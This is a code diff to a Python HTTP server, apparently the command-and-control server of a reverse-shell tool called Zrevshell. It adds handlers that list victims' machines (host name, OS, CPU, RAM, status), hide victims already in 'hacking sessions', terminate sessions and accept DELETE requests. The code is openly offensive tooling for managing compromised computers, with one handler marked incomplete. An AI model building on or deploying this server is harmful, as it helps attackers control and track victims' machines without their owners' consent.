@@ -53,6 +53,15 @@ class ZrevshellServer(BaseHTTPRequestHandler):
                 self.handle_cmd_fetch_res,
                 HTTPMethod.GET,
             ],
+            ut.ServerCommands.list_victims: [
+                self.handle_cmd_list_victims,
+                HTTPMethod.GET,
+            ],
+            ut.ServerCommands.exit_session: [
+                self.handle_cmd_exit_session,
+                HTTPMethod.DELETE,
+            ],
+            ut.ServerCommands.delete_hacker: [lambda: None, HTTPMethod.DELETE],
         }
 
         # Initializing our parent, cuz of respect.
@@ -202,9 +211,82 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         if real_session_id != requested_session:
             return False
+
+        # We also need to check if the session requested is not a dead session
+        if not self.hacking_sessions.check_session_alive(requested_session):
+            return None
+
         return True
 
     # ---------- Server command handler methods ---------- #
+
+    def handle_cmd_list_victims(
+        self, client_id: str, client_type: int, req_body: str | None
+    ):
+        """Handling the command 'list_victims'"""
+        # Ok so this is going to be simple, open the database, read all the clients and
+        # return them.
+        # TODO: Making the result filterable
+
+        victims = self.database.query(
+            "SELECT victim_info.*, clients.status FROM victim_info LEFT JOIN clients ON victim_info.id=clients.client_id"
+        )
+
+        if victims is None:
+            # Some error must have occurred let's simply report it
+            # as an internal server error
+            return sh.HandlerResponse(False, HTTPStatus.INTERNAL_SERVER_ERROR)
+
+        # Now change the data into a dictionary, stringify it and send it
+        victims = js.dumps(
+            [
+                {
+                    "client_id": victim_info[0],
+                    "host_name": victim_info[1],
+                    "os": victim_info[2],
+                    "arch": victim_info[3],
+                    "cpu": victim_info[4],
+                    "ram": victim_info[5],
+                    "status": victim_info[6],
+                }
+                for victim_info in victims
+                if not self.hacking_sessions.check_client_in_session(
+                    victim_info[0]
+                )  # Means filtering the ones that are currently in a session
+            ]
+        )
+
+        # Now let's package and send the data
+        victims = ut.encode_token(victims).encode()
+
+        return sh.HandlerResponse(
+            True, HTTPStatus.OK, victims, {"content-length": str(len(victims))}
+        )
+
+    def handle_cmd_exit_session(
+        self, client_id: str, client_type: int, req_body: str | None
+    ):
+        """Handle the exit_session command."""
+        # Ok we're going to follow procedures as they do
+        # in other session using commands
+        session_id = req_body
+
+        # ! This is not complete yet.
+
+        if session_id is None or session_id == "":
+            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
+
+        # Now validate the session
+        is_valid_session = self.validate_session(client_id, session_id)
+        if not is_valid_session:
+            return sh.HandlerResponse(False, HTTPStatus.NOT_ACCEPTABLE)
+
+        # If it is a valid session now let's remove the session
+        # easily
+        self.hacking_sessions.kill_session(session_id)
+
+        # Respond to the client with an OK
+        return sh.HandlerResponse(True, HTTPStatus.OK)
 
     def handle_cmd_register(
         self, client_id: str, client_type: int, req_body: str | None
@@ -585,6 +667,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     def do_POST(self):
         """Handle POST requests."""
         self.main_handler(HTTPMethod.POST)
+
+    def do_DELETE(self):
+        """Handle DELETE requests."""
+        self.main_handler(HTTPMethod.DELETE)
 
 
 def run_server(
